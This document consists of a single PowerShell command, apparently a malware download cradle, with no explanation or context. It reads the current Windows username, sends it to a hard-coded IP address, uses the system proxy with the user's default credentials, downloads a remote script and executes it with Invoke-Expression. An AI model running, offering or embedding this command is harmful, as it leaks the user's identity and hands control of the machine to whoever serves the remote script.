
$x=$Env:username;$u="http://54.213.195.138/s2.txt?u=" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;

